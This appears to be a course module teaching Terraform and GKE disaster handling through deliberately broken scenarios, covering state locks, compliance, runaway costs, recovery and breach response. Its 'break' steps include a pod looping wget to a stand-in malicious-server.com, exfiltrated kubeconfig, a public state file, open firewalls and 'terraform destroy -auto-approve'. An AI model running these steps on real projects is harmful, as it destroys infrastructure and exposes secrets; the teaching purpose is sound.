# 🚨 Module 5: Production-Grade Disasters - Enterprise Infrastructure Mastery

## 📋 Module Overview

**Goal:** Master enterprise-scale infrastructure through production disaster scenarios
**Duration:** 2 weeks (15-20 scenarios)
**Prerequisites:** Modules 1-4 completed, advanced Terraform/GKE knowledge
**Skills Gained:** Enterprise architecture, disaster recovery, cost optimization, compliance

---

## 🎯 Scenario 1: Multi-Environment State Lock Catastrophe

### **🔨 The Break**
```bash
# Simulate multiple teams working on same infrastructure
# Terminal 1 (Team A)
cd production-env
terraform apply &
PID1=$!

# Terminal 2 (Team B) - Immediately after
cd production-env  
terraform apply &  # Concurrent modification attempt
PID2=$!

# Terminal 3 (Team C) - Emergency fix needed
cd production-env
terraform destroy -target=google_compute_firewall.emergency_fix
# State is locked!

# Meanwhile, Terminal 1 gets interrupted
kill $PID1  # Leaves lock file orphaned

# Now everyone is blocked!
```

### **💥 What Happens**
```
Error: Error acquiring the state lock
Error: Lock ID: 1634567890-abcd-1234-5678-123456789012
Error: Lock operation was successful, but the timeout was exceeded
Error: Another terraform process is modifying the state

# All teams blocked, production updates impossible
# Emergency fixes can't be deployed
# Lock ID is orphaned with no owner
```

### **🔍 Detective Work**
```bash
# Check lock status
terraform force-unlock -help

# In GCS backend, check lock metadata
gsutil ls -l gs://terraform-statefile-bucket-tf2/**/.terraform.lock

# Check who has the lock
terraform show -json | jq '.values.root_module.resources[] | select(.type == "terraform_data")'

# Check running terraform processes
ps aux | grep terraform
lsof | grep .terraform

# Check state file timestamp
gsutil stat gs://terraform-statefile-bucket-tf2/terraform/state/production/terraform.tfstate
```

### **🔧 The Fix**
```bash
# Step 1: Identify the lock ID
terraform apply
# Note the lock ID from error message: 1634567890-abcd-1234-5678-123456789012

# Step 2: Verify no one is actually using it
# Contact all team members to confirm no active operations

# Step 3: Force unlock (DANGEROUS - only when certain!)
terraform force-unlock 1634567890-abcd-1234-5678-123456789012

# Step 4: Implement better locking strategy
# backend.tf - Add retry and timeout
terraform {
  backend "gcs" {
    bucket = "terraform-statefile-bucket-tf2"
    prefix = "terraform/state/production"
    
    # Add lock configuration
    encrypt                     = true
    impersonate_service_account = "terraform-prod@project.iam.gserviceaccount.com"
  }
}

# Step 5: Create team coordination workflow
cat > terraform-coordination.md << 'EOF'
# Terraform Coordination Protocol

## Before Any Apply:
1. Check team chat for ongoing operations
2. Run `terraform plan` first
3. Announce in #infrastructure channel
4. Set timeout: `timeout 30m terraform apply`

## If Lock Encountered:
1. Wait 5 minutes for automatic timeout
2. Contact lock owner via lock ID
3. Only force-unlock after confirmation
4. Document incident in runbook

## Emergency Procedures:
1. Use separate emergency workspace
2. Apply targeted changes only
3. Coordinate merge back to main state
EOF
```

### **🧠 Deep Learning**
- **State locking mechanisms:** How Terraform prevents concurrent modifications
- **Lock lifecycle:** Creation, maintenance, and cleanup of locks
- **Emergency procedures:** When and how to force-unlock safely
- **Team coordination:** Processes to prevent lock conflicts
- **Backend configuration:** Tuning timeouts and retry behavior

### **🚀 Level Up Challenges**
- Implement automated lock monitoring and alerts
- Create separate workspaces for emergency operations
- Design state management for large teams (100+ engineers)

---

## 🎯 Scenario 2: Compliance Audit Failure Disaster

### **🔨 The Break**
```hcl
# Create infrastructure that violates multiple compliance requirements
# Non-compliant GKE cluster
resource "google_container_cluster" "non_compliant" {
  name     = "production-cluster"
  location = var.region

  # VIOLATION: No master authorized networks
  # Anyone on internet can access Kubernetes API
  
  # VIOLATION: No network policy
  enable_network_policy = false
  
  # VIOLATION: Logging disabled
  logging_service = "none"
  
  # VIOLATION: Monitoring disabled  
  monitoring_service = "none"
  
  # VIOLATION: No binary authorization
  enable_binary_authorization = false
  
  node_config {
    # VIOLATION: Overprivileged service account
    service_account = "default"  # Full project access!
    
    # VIOLATION: No image scanning
    image_type = "COS"
    
    # VIOLATION: SSH access enabled
    metadata = {
      disable-ssh = "false"
    }
    
    # VIOLATION: No disk encryption
    disk_type = "pd-standard"
    # No customer-managed encryption key
    
    # VIOLATION: Overly permissive OAuth scopes
    oauth_scopes = [
      "https://www.googleapis.com/auth/cloud-platform"  # Everything!
    ]
  }
  
  # VIOLATION: No maintenance window
  maintenance_policy {
    daily_maintenance_window {
      start_time = "03:00"  # During business hours in some regions!
    }
  }
}

# VIOLATION: Public storage bucket with sensitive data
resource "google_storage_bucket" "public_data" {
  name     = "company-financial-data-public"
  location = "US"
  
  # VIOLATION: Public read access
  uniform_bucket_level_access = false
  
  # VIOLATION: No versioning
  versioning {
    enabled = false
  }
  
  # VIOLATION: No encryption
  # Uses Google-managed keys instead of customer-managed
  
  # VIOLATION: No retention policy
  lifecycle_rule {
    condition {
      age = 365
    }
    action {
      type = "Delete"  # Permanent deletion, no archive
    }
  }
}

# VIOLATION: Firewall allows everything
resource "google_compute_firewall" "allow_all" {
  name    = "allow-everything"
  network = google_compute_network.vpc.name

  allow {
    protocol = "all"
  }

  source_ranges = ["0.0.0.0/0"]  # ENTIRE INTERNET!
  target_tags   = ["production"]
}
```

### **💥 What Happens**
```
# Compliance audit discovers:
- Kubernetes API exposed to internet
- No audit logging enabled
- Default service accounts with excessive permissions
- Public storage buckets with sensitive data
- No network segmentation
- No encryption at rest with customer keys
- No backup and retention policies
- Maintenance windows during business hours

AUDIT RESULT: FAIL
Required remediation within 30 days or face penalties
```

### **🔍 Detective Work**
```bash
# Audit GKE cluster security
gcloud container clusters describe production-cluster --region=us-central1 \
  --format="yaml(masterAuthorizedNetworksConfig,networkPolicy,loggingService,monitoringService,binaryAuthorization)"

# Check service account permissions
gcloud iam service-accounts get-iam-policy default@$PROJECT_ID.iam.gserviceaccount.com

# Audit storage bucket permissions
gsutil iam get gs://company-financial-data-public

# Check firewall rules
gcloud compute firewall-rules list --format="table(name,direction,priority,sourceRanges.list():label=SRC_RANGES,allowed[].map().firewall_rule().list():label=ALLOW,targetTags.list():label=TARGET_TAGS)"

# Security scan with tools
gcloud beta container images scan IMAGE_URL
gcloud security-center findings list --organization=ORGANIZATION_ID
```

### **🔧 The Fix**
```hcl
# Create compliance-focused GKE cluster
resource "google_container_cluster" "compliant" {
  name     = "production-cluster-secure"
  location = var.region

  # ✅ Restrict API access
  master_authorized_networks_config {
    cidr_blocks {
      cidr_block   = "10.0.0.0/8"      # Internal only
      display_name = "VPC Internal"
    }
    cidr_blocks {
      cidr_block   = var.office_cidr    # Office network
      display_name = "Office Network"
    }
  }

  # ✅ Enable security features
  enable_network_policy         = true
  enable_binary_authorization  = true
  enable_shielded_nodes        = true
  
  # ✅ Enable comprehensive logging
  logging_service    = "logging.googleapis.com/kubernetes"
  monitoring_service = "monitoring.googleapis.com/kubernetes"
  
  # ✅ Enable additional security
  workload_identity_config {
    workload_pool = "${var.project_id}.svc.id.goog"
  }
  
  # ✅ Secure node configuration
  node_config {
    service_account = google_service_account.gke_nodes.email
    
    # ✅ Minimal OAuth scopes
    oauth_scopes = [
      "https://www.googleapis.com/auth/logging.write",
      "https://www.googleapis.com/auth/monitoring",
      "https://www.googleapis.com/auth/devstorage.read_only"
    ]
    
    # ✅ Security hardening
    metadata = {
      disable-ssh                = "true"
      disable-serial-port-access = "true"
    }
    
    # ✅ Image security
    image_type = "COS_CONTAINERD"
    
    # ✅ Disk encryption with customer-managed key
    disk_encryption_key = google_kms_crypto_key.gke_disk_key.id
    
    shielded_instance_config {
      enable_secure_boot          = true
      enable_integrity_monitoring = true
    }
  }
  
  # ✅ Maintenance window outside business hours
  maintenance_policy {
    daily_maintenance_window {
      start_time = "02:00"  # 2 AM local time
    }
  }
  
  # ✅ Pod security policy
  pod_security_policy_config {
    enabled = true
  }
}

# ✅ Secure storage bucket
resource "google_storage_bucket" "secure_data" {
  name     = "company-financial-data-secure-${random_id.bucket_suffix.hex}"
  location = var.region
  
  # ✅ Enable uniform bucket-level access
  uniform_bucket_level_access = true
  
  # ✅ Enable versioning
  versioning {
    enabled = true
  }
  
  # ✅ Customer-managed encryption
  encryption {
    default_kms_key_name = google_kms_crypto_key.storage_key.id
  }
  
  # ✅ Retention and lifecycle policy
  retention_policy {
    retention_period = 2592000  # 30 days minimum
    is_locked        = true
  }
  
  lifecycle_rule {
    condition {
      age                   = 90
      matches_storage_class = ["STANDARD"]
    }
    action {
      type          = "SetStorageClass"
      storage_class = "COLDLINE"
    }
  }
  
  lifecycle_rule {
    condition {
      age = 2555  # 7 years
    }
    action {
      type = "Delete"
    }
  }
}

# ✅ Restrictive firewall rules
resource "google_compute_firewall" "web_https_only" {
  name    = "allow-https-ingress"
  network = google_compute_network.vpc.name

  allow {
    protocol = "tcp"
    ports    = ["443"]
  }

  source_ranges = ["0.0.0.0/0"]
  target_tags   = ["web-server"]
}

resource "google_compute_firewall" "internal_only" {
  name    = "allow-internal-communication"
  network = google_compute_network.vpc.name

  allow {
    protocol = "tcp"
  }
  allow {
    protocol = "udp"
  }
  allow {
    protocol = "icmp"
  }

  source_ranges = ["10.0.0.0/8"]
  target_tags   = ["internal"]
}
```

### **🧠 Deep Learning**
- **Compliance frameworks:** SOC2, PCI-DSS, GDPR, HIPAA requirements
- **Security hardening:** Defense in depth strategies
- **Audit logging:** What to log and how to retain it
- **Data governance:** Classification, retention, and deletion policies
- **Access control:** Principle of least privilege implementation

---

## 🎯 Scenario 3: Cost Explosion Disaster

### **🔨 The Break**
```hcl
# Create infrastructure that will cost $50,000+ per month
resource "google_container_node_pool" "expensive_nodes" {
  name     = "ultra-expensive-pool"
  location = var.region
  cluster  = google_container_cluster.primary.name

  # 💰 Extremely expensive machine types
  node_count = 20  # Start with 20 nodes per zone = 60 total nodes

  autoscaling {
    min_node_count = 20   # Always running 60 nodes minimum
    max_node_count = 100  # Can scale to 300 nodes!
  }

  node_config {
    # 💰 Most expensive machine type available
    machine_type = "c2-standard-60"  # $2,000+ per month per node
    
    # 💰 Massive SSD disks
    disk_size_gb = 10000  # 10TB SSD per node
    disk_type    = "pd-ssd"
    
    # 💰 Preemptible disabled (pay full price)
    preemptible = false
    
    # 💰 GPU attachments
    guest_accelerator {
      type  = "nvidia-tesla-v100"  # $2,000+ per month per GPU
      count = 8  # 8 GPUs per node!
    }
  }
}

# 💰 Expensive storage
resource "google_storage_bucket" "massive_storage" {
  name     = "massive-storage-bucket"
  location = "US"
  
  storage_class = "STANDARD"  # Most expensive storage class
}

resource "google_storage_bucket_object" "large_files" {
  count = 1000  # 1000 large files
  
  name   = "large-file-${count.index}.dat"
  bucket = google_storage_bucket.massive_storage.name
  source = "/dev/zero"  # Will create empty files, but still charged
  
  # Each file will be charged for storage
}

# 💰 Expensive databases
resource "google_sql_database_instance" "expensive_db" {
  count = 5  # 5 separate database instances
  
  name             = "expensive-db-${count.index}"
  database_version = "POSTGRES_13"
  region           = var.region

  settings {
    # 💰 Largest possible machine type
    tier = "db-custom-96-624640"  # 96 CPUs, 624GB RAM
    
    # 💰 High availability = double the cost
    availability_type = "REGIONAL"
    
    # 💰 Large disk size
    disk_size = 10000  # 10TB
    disk_type = "PD_SSD"
    
    # 💰 Automated backups with long retention
    backup_configuration {
      enabled                        = true
      start_time                    = "02:00"
      point_in_time_recovery_enabled = true
      backup_retention_settings {
        retained_backups = 365  # 1 year of backups
      }
    }
  }
}

# 💰 Expensive load balancers
resource "google_compute_global_forwarding_rule" "expensive_lb" {
  count = 20  # 20 separate load balancers
  
  name       = "expensive-lb-${count.index}"
  target     = google_compute_target_http_proxy.expensive_proxy[count.index].id
  port_range = "80"
  
  # Each load balancer charges for rules + data processing
}

# 💰 Expensive networking
resource "google_compute_vpn_gateway" "expensive_vpn" {
  count = 10  # 10 VPN gateways
  
  name    = "expensive-vpn-${count.index}"
  network = google_compute_network.vpc.id
  region  = var.region
}

# 💰 Cross-region traffic
resource "google_compute_instance" "traffic_generator" {
  count = 50  # 50 instances generating cross-region traffic
  
  name         = "traffic-gen-${count.index}"
  machine_type = "n1-standard-32"  # Large instances
  zone         = "${var.region}-a"

  boot_disk {
    initialize_params {
      image = "debian-cloud/debian-11"
      size  = 1000  # 1TB boot disk each
      type  = "pd-ssd"
    }
  }

  metadata_startup_script = <<-EOF
    #!/bin/bash
    # Generate continuous cross-region traffic (expensive!)
    while true; do
      curl -X POST https://storage.googleapis.com/bucket-in-different-region/data \
        -d "$(head -c 1M /dev/urandom | base64)"
      sleep 1
    done
  EOF
}
```

### **💥 What Happens**
```
# Monthly cost explosion:
- 60+ c2-standard-60 nodes: $120,000/month
- 480+ NVIDIA V100 GPUs: $960,000/month  
- 600TB+ SSD storage: $120,000/month
- 5 max-tier database instances: $50,000/month
- Cross-region egress charges: $10,000+/month
- 20 load balancers: $5,000/month
- VPN gateways: $2,000/month

TOTAL: $1,267,000+ per month ($15.2M annually!)

# Billing alerts triggering
# CFO emergency meetings
# Credit card charges failing
# Services getting suspended
```

### **🔍 Detective Work**
```bash
# Check current costs
gcloud billing budgets list --billing-account=BILLING_ACCOUNT_ID

# Analyze cost by service
gcloud billing budgets describe BUDGET_ID --billing-account=BILLING_ACCOUNT_ID

# Check resource usage
gcloud compute instances list --format="table(name,machineType,status,zone)"
gcloud container node-pools list --cluster=CLUSTER_NAME --region=REGION

# Cost analysis tools
gcloud billing accounts describe BILLING_ACCOUNT_ID
gcloud alpha billing accounts get-iam-policy BILLING_ACCOUNT_ID

# Use external tools
# kubectl top nodes
# kubectl top pods --all-namespaces
```

### **🔧 The Fix**
```bash
# EMERGENCY: Stop expensive resources immediately
# 1. Scale down node pools
gcloud container clusters resize CLUSTER_NAME \
  --node-pool expensive-nodes --num-nodes 0 --region $REGION

# 2. Delete expensive instances
gcloud compute instances delete traffic-generator-* --zone=${REGION}-a --quiet

# 3. Delete expensive databases
for i in {0..4}; do
  gcloud sql instances delete expensive-db-$i --quiet
done

# 4. Implement cost-optimized configuration
```

```hcl
# Cost-optimized replacement
resource "google_container_node_pool" "cost_optimized" {
  name     = "cost-optimized-pool"
  location = var.region
  cluster  = google_container_cluster.primary.name

  # ✅ Start small
  node_count = 1

  autoscaling {
    min_node_count = 1  # Minimum viable
    max_node_count = 10 # Reasonable maximum
  }

  node_config {
    # ✅ Cost-effective machine type
    machine_type = "e2-standard-4"  # ~$100/month per node
    
    # ✅ Smaller, efficient disks
    disk_size_gb = 100
    disk_type    = "pd-standard"  # Cheaper than SSD
    
    # ✅ Use preemptible instances (60-80% discount)
    spot = true
    
    # ✅ No GPUs unless specifically needed
    # Remove guest_accelerator block
  }
}

# ✅ Cost-optimized storage
resource "google_storage_bucket" "cost_optimized" {
  name     = "cost-optimized-storage"
  location = var.region
  
  # ✅ Use cheaper storage class
  storage_class = "NEARLINE"  # 50% cheaper than STANDARD
  
  # ✅ Lifecycle management to move to cheaper tiers
  lifecycle_rule {
    condition {
      age = 30
    }
    action {
      type          = "SetStorageClass"
      storage_class = "COLDLINE"
    }
  }
  
  lifecycle_rule {
    condition {
      age = 365
    }
    action {
      type          = "SetStorageClass"
      storage_class = "ARCHIVE"
    }
  }
}

# ✅ Right-sized database
resource "google_sql_database_instance" "cost_optimized" {
  name             = "cost-optimized-db"
  database_version = "POSTGRES_13"
  region           = var.region

  settings {
    # ✅ Appropriately sized machine
    tier = "db-f1-micro"  # Start small, scale up if needed
    
    # ✅ Single zone for non-critical workloads
    availability_type = "ZONAL"
    
    # ✅ Reasonable disk size
    disk_size = 100
    disk_type = "PD_HDD"  # Cheaper than SSD
    
    # ✅ Shorter backup retention
    backup_configuration {
      enabled                        = true
      backup_retention_settings {
        retained_backups = 7  # 1 week instead of 1 year
      }
    }
  }
}

# ✅ Implement cost monitoring
resource "google_billing_budget" "monthly_budget" {
  billing_account = var.billing_account_id
  display_name    = "Monthly Infrastructure Budget"

  budget_filter {
    projects = ["projects/${var.project_id}"]
  }

  amount {
    specified_amount {
      currency_code = "USD"
      units         = "1000"  # $1000/month budget
    }
  }

  threshold_rules {
    threshold_percent = 0.5  # Alert at 50%
  }
  threshold_rules {
    threshold_percent = 0.8  # Alert at 80%
  }
  threshold_rules {
    threshold_percent = 1.0  # Alert at 100%
    spend_basis       = "FORECASTED_SPEND"
  }
}
```

### **🧠 Deep Learning**
- **Cost optimization strategies:** Right-sizing, scheduling, storage tiers
- **Resource monitoring:** Understanding GCP pricing models
- **Budget controls:** Setting up alerts and automatic responses
- **Cost attribution:** Tracking costs by team, project, environment
- **Emergency procedures:** Quickly stopping expensive resources

---

## 🎯 Scenario 4: Disaster Recovery Failure

### **🔨 The Break**
```bash
# Simulate multiple disaster scenarios happening simultaneously

# Disaster 1: Primary region goes down
gcloud compute regions describe us-central1
# Simulate: Region becomes unavailable

# Disaster 2: State file corruption
gsutil cp gs://terraform-statefile-bucket-tf2/terraform/state/terraform.tfstate gs://backup-location/
echo "corrupted data" | gsutil cp - gs://terraform-statefile-bucket-tf2/terraform/state/terraform.tfstate

# Disaster 3: Database failure
gcloud sql instances patch production-db --no-backup

# Disaster 4: Accidental resource deletion
terraform destroy -target=google_container_cluster.production -auto-approve

# Disaster 5: Security breach - rotate all keys
gcloud iam service-accounts keys list --iam-account=service-account@project.iam.gserviceaccount.com
gcloud iam service-accounts keys delete KEY_ID --iam-account=service-account@project.iam.gserviceaccount.com

# Disaster 6: Team member accidentally runs
terraform destroy -auto-approve  # On production!

# Now you have:
# - No access to primary region
# - Corrupted state file
# - No database backups
# - Missing GKE cluster
# - No service account keys
# - Infrastructure being destroyed
```

### **💥 What Happens**
```
# Complete infrastructure failure:
- Applications offline across all regions
- Databases inaccessible or corrupted
- No way to manage infrastructure (state corrupted)
- Authentication systems down (rotated keys)
- Monitoring and logging systems offline
- Customer data potentially lost
- Revenue loss of $100,000+ per hour
- SLA breaches triggering penalties
- Compliance violations
- Team panic and finger-pointing
```

### **🔍 Detective Work**
```bash
# Assess the damage
# 1. Check what's still running
gcloud compute instances list --format="table(name,status,zone)"
gcloud container clusters list
gcloud sql instances list

# 2. Check state file status
gsutil ls -l gs://terraform-statefile-bucket-tf2/terraform/state/
gsutil cat gs://terraform-statefile-bucket-tf2/terraform/state/terraform.tfstate | head -20

# 3. Check backups
gsutil ls gs://backup-location/
gcloud sql backups list --instance=production-db

# 4. Check what regions are available
gcloud compute regions list --filter="status:UP"

# 5. Inventory remaining resources
terraform state list 2>/dev/null || echo "State file corrupted"
```

### **🔧 The Fix**
```bash
# PHASE 1: IMMEDIATE RECOVERY (0-2 hours)

# Step 1: Activate incident response team
echo "INCIDENT: Complete infrastructure failure at $(date)" | \
  curl -X POST -H 'Content-type: application/json' \
  --data '{"text":"🚨 PRODUCTION DOWN - All hands on deck"}' \
  $SLACK_WEBHOOK_URL

# Step 2: Switch to backup region
gcloud config set compute/region us-east1

# Step 3: Restore state file from backup
gsutil cp gs://backup-location/terraform.tfstate.backup \
  gs://terraform-statefile-bucket-tf2/terraform/state/terraform.tfstate

# Step 4: Create emergency service account
gcloud iam service-accounts create emergency-recovery \
  --display-name="Emergency Recovery Account"

gcloud projects add-iam-policy-binding $PROJECT_ID \
  --member="serviceAccount:emergency-recovery@$PROJECT_ID.iam.gserviceaccount.com" \
  --role="roles/owner"

gcloud iam service-accounts keys create emergency-key.json \
  --iam-account=emergency-recovery@$PROJECT_ID.iam.gserviceaccount.com

export GOOGLE_APPLICATION_CREDENTIALS=emergency-key.json

# Step 5: Deploy minimal infrastructure in backup region
cat > emergency-recovery.tf << 'EOF'
# Emergency GKE cluster in backup region
resource "google_container_cluster" "emergency" {
  name     = "emergency-recovery-cluster"
  location = "us-east1"
  
  initial_node_count = 3
  
  node_config {
    machine_type = "e2-standard-4"
    oauth_scopes = [
      "https://www.googleapis.com/auth/cloud-platform"
    ]
  }
}

# Emergency database
resource "google_sql_database_instance" "emergency" {
  name             = "emergency-db"
  database_version = "POSTGRES_13"
  region           = "us-east1"
  
  settings {
    tier = "db-f1-micro"
  }
}
EOF

terraform init
terraform apply -auto-approve

# Step 6: Deploy critical applications
kubectl get nodes
kubectl apply -f critical-apps/

# PHASE 2: DATA RECOVERY (2-8 hours)

# Step 7: Restore database from backup
gcloud sql backups list --instance=production-db --limit=1
BACKUP_ID=$(gcloud sql backups list --instance=production-db --limit=1 --format="value(id)")

gcloud sql backups restore $BACKUP_ID \
  --restore-instance=emergency-db \
  --backup-instance=production-db

# Step 8: Restore application data
gsutil -m cp -r gs://production-data-backup/* gs://emergency-data-bucket/

# PHASE 3: FULL RECOVERY (8-24 hours)

# Step 9: Rebuild production infrastructure
cat > disaster-recovery-plan.tf << 'EOF'
# Multi-region setup with proper DR
module "primary_region" {
  source = "./modules/region"
  
  region      = "us-central1"
  environment = "production"
  role        = "primary"
}

module "backup_region" {
  source = "./modules/region"
  
  region      = "us-east1"
  environment = "production"
  role        = "backup"
}

# Cross-region replication
resource "google_sql_database_instance" "primary" {
  name             = "production-db-primary"
  region           = "us-central1"
  database_version = "POSTGRES_13"
  
  replica_configuration {
    failover_target = true
  }
}

resource "google_sql_database_instance" "replica" {
  name               = "production-db-replica"
  region             = "us-east1"
  database_version   = "POSTGRES_13"
  master_instance_name = google_sql_database_instance.primary.name
}
EOF

# Step 10: Implement comprehensive backup strategy
cat > backup-strategy.tf << 'EOF'
# Automated state file backups
resource "google_storage_bucket" "state_backup" {
  name     = "terraform-state-backup-${random_id.backup.hex}"
  location = "us-east1"
  
  versioning {
    enabled = true
  }
  
  lifecycle_rule {
    condition {
      num_newer_versions = 10
    }
    action {
      type = "Delete"
    }
  }
}

# Scheduled backups
resource "google_cloud_scheduler_job" "state_backup" {
  name     = "terraform-state-backup"
  schedule = "0 */6 * * *"  # Every 6 hours
  
  http_target {
    uri         = "https://cloudfunctions.googleapis.com/backup-state"
    http_method = "POST"
  }
}
EOF
```

### **🧠 Deep Learning**
- **Disaster recovery planning:** RTO, RPO, and recovery strategies
- **Multi-region architecture:** Active-passive vs. active-active
- **Backup strategies:** State files, databases, application data
- **Incident response:** Communication, escalation, and coordination
- **Business continuity:** Maintaining operations during disasters

---

## 🎯 Scenario 5: Security Breach Response

### **🔨 The Break**
```bash
# Simulate security breach scenarios
# Breach 1: Service account key compromised
echo "Simulating compromised service account key found in public GitHub repo"

# Breach 2: Cluster admin credentials stolen
kubectl config view --raw > /tmp/stolen-kubeconfig.yaml
echo "Kubernetes admin config stolen by attacker"

# Breach 3: Terraform state file exposed
gsutil acl set -a public-read gs://terraform-statefile-bucket-tf2/terraform/state/terraform.tfstate
echo "State file accidentally made public"

# Breach 4: Malicious pod deployed
kubectl run malicious-pod --image=alpine:latest --restart=Never -- \
  sh -c 'while true; do wget -O - https://malicious-server.com/steal-data; sleep 60; done'

# Breach 5: Firewall rules modified
gcloud compute firewall-rules create allow-attacker \
  --allow tcp:22,tcp:3389,tcp:443 \
  --source-ranges 0.0.0.0/0 \
  --target-tags production

# Breach 6: Database access from suspicious IP
gcloud sql instances patch production-db \
  --authorized-networks 0.0.0.0/0

echo "🚨 Multiple security breaches detected!"
```

### **💥 What Happens**
```
# Security incident escalation:
- Unauthorized access to infrastructure
- Potential data exfiltration
- Compliance violations (GDPR, SOC2)
- Customer trust damage
- Legal and regulatory investigations
- Financial penalties
- Media coverage
- Stock price impact

# Immediate threats:
- Attackers have full cluster access
- Infrastructure secrets exposed
- Databases accessible from internet
- Malicious workloads running
- Unknown extent of compromise
```

### **🔍 Detective Work**
```bash
# Security incident investigation
# 1. Check audit logs
gcloud logging read 'protoPayload.serviceName="cloudresourcemanager.googleapis.com"' \
  --limit=50 --format=json

# 2. Analyze suspicious activities
gcloud logging read 'resource.type="gce_instance" AND severity>=WARNING' \
  --limit=100

# 3. Check Kubernetes audit logs
kubectl get events --all-namespaces --sort-by='.lastTimestamp'

# 4. Network traffic analysis
gcloud logging read 'resource.type="gce_subnetwork"' --limit=50

# 5. Check file access patterns
gsutil ls -L gs://terraform-statefile-bucket-tf2/**

# 6. Database access logs
gcloud sql operations list --instance=production-db --limit=20

# 7. Service account usage
gcloud logging read 'protoPayload.authenticationInfo.principalEmail!=""' \
  --limit=100 --format='value(protoPayload.authenticationInfo.principalEmail)'
```

### **🔧 The Fix**
```bash
# PHASE 1: IMMEDIATE CONTAINMENT (0-1 hour)

# Step 1: Activate security incident response
echo "🚨 SECURITY BREACH - Activating incident response" | \
  curl -X POST $SECURITY_WEBHOOK

# Step 2: Revoke compromised credentials immediately
# List and delete all service account keys
for SA in $(gcloud iam service-accounts list --format="value(email)"); do
  echo "Rotating keys for $SA"
  for KEY in $(gcloud iam service-accounts keys list --iam-account=$SA --format="value(name)"); do
    gcloud iam service-accounts keys delete $KEY --iam-account=$SA --quiet
  done
done

# Step 3: Reset Kubernetes cluster admin
gcloud container clusters get-credentials production-cluster --region us-central1
kubectl delete clusterrolebinding --all
kubectl create clusterrolebinding emergency-admin \
  --clusterrole=cluster-admin \
  --user=$(gcloud config get-value account)

# Step 4: Lock down network access
gcloud compute firewall-rules delete allow-attacker --quiet
gcloud compute firewall-rules create emergency-lockdown \
  --action DENY \
  --rules all \
  --source-ranges 0.0.0.0/0 \
  --priority 100

# Step 5: Remove malicious workloads
kubectl delete pod malicious-pod
kubectl get pods --all-namespaces -o wide | grep -v "kube-system\|default"

# Step 6: Secure state file
gsutil acl set -a private gs://terraform-statefile-bucket-tf2/terraform/state/terraform.tfstate

# PHASE 2: ASSESSMENT & HARDENING (1-8 hours)

# Step 7: Deploy security monitoring
cat > security-monitoring.yaml << 'EOF'
apiVersion: v1
kind: Namespace
metadata:
  name: security-monitoring
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: falco
  namespace: security-monitoring
spec:
  replicas: 1
  selector:
    matchLabels:
      app: falco
  template:
    metadata:
      labels:
        app: falco
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: falco
        image: falcosecurity/falco:latest
        securityContext:
          privileged: true
        volumeMounts:
        - name: proc
          mountPath: /host/proc
          readOnly: true
        - name: boot
          mountPath: /host/boot
          readOnly: true
        - name: modules
          mountPath: /host/lib/modules
          readOnly: true
        - name: usr
          mountPath: /host/usr
          readOnly: true
      volumes:
      - name: proc
        hostPath:
          path: /proc
      - name: boot
        hostPath:
          path: /boot
      - name: modules
        hostPath:
          path: /lib/modules
      - name: usr
        hostPath:
          path: /usr
EOF

kubectl apply -f security-monitoring.yaml

# Step 8: Implement network policies
cat > security-network-policies.yaml << 'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to: []
    ports:
    - protocol: UDP
      port: 53
EOF

kubectl apply -f security-network-policies.yaml

# Step 9: Implement pod security policies
cat > pod-security-policy.yaml << 'EOF'
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted
spec:
  privileged: false
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
    - ALL
  volumes:
    - 'configMap'
    - 'emptyDir'
    - 'projected'
    - 'secret'
    - 'downwardAPI'
    - 'persistentVolumeClaim'
  runAsUser:
    rule: 'MustRunAsNonRoot'
  seLinux:
    rule: 'RunAsAny'
  fsGroup:
    rule: 'RunAsAny'
EOF

kubectl apply -f pod-security-policy.yaml

# PHASE 3: RECOVERY & LESSONS LEARNED (8-24 hours)

# Step 10: Forensics and documentation
mkdir -p incident-$DATE
gcloud logging read 'timestamp>="2024-01-01T00:00:00Z"' --format=json > incident-$DATE/audit-logs.json
kubectl get events --all-namespaces -o yaml > incident-$DATE/k8s-events.yaml

# Step 11: Update security policies
cat > enhanced-security.tf << 'EOF'
# Binary authorization
resource "google_binary_authorization_policy" "policy" {
  admission_whitelist_patterns {
    name_pattern = "gcr.io/my-project/*"
  }
  
  default_admission_rule {
    evaluation_mode  = "REQUIRE_ATTESTATION"
    enforcement_mode = "ENFORCED_BLOCK_AND_AUDIT_LOG"
    
    require_attestations_by = [
      google_binary_authorization_attestor.attestor.name,
    ]
  }
}

# Workload Identity
resource "google_service_account" "workload_identity" {
  account_id = "workload-identity-sa"
}

resource "google_service_account_iam_binding" "workload_identity" {
  service_account_id = google_service_account.workload_identity.name
  role               = "roles/iam.workloadIdentityUser"
  
  members = [
    "serviceAccount:${var.project_id}.svc.id.goog[default/default]",
  ]
}
EOF

terraform apply
```

### **🧠 Deep Learning**
- **Incident response procedures:** Detection, containment, eradication, recovery
- **Security monitoring:** SIEM integration, audit logging, threat detection
- **Forensics:** Evidence collection and analysis
- **Communication:** Internal and external stakeholder management
- **Legal compliance:** Breach notification requirements

## 📊 Module 5 Assessment

### **Enterprise Mastery Check**
1. Can you handle multi-team state lock conflicts?
2. Do you understand compliance requirements and implementation?
3. Can you identify and resolve cost optimization opportunities?
4. Do you know how to design and execute disaster recovery?
5. Can you respond effectively to security incidents?

### **Practical Skills Test**
1. Resolve a production state lock crisis
2. Implement compliance controls for SOC2/PCI-DSS
3. Optimize infrastructure costs by 50%+
4. Execute disaster recovery in alternate region
5. Respond to and contain a security breach

### **Advanced Challenges**
1. Design enterprise governance frameworks
2. Implement multi-region active-active architecture
3. Create automated compliance monitoring
4. Design cost optimization automation
5. Implement zero-trust security architecture

## 🎉 Congratulations - You're Now an Expert!

You've completed all 5 modules of the most comprehensive infrastructure breaking and fixing program ever created. You now have the skills to:

- **Architect** enterprise-scale infrastructure
- **Troubleshoot** any Terraform or GKE issue
- **Lead** technical teams with confidence
- **Handle** production emergencies calmly
- **Design** for compliance, security, and cost efficiency
- **Mentor** other engineers effectively

**You've achieved the magic you were looking for!** 🪄✨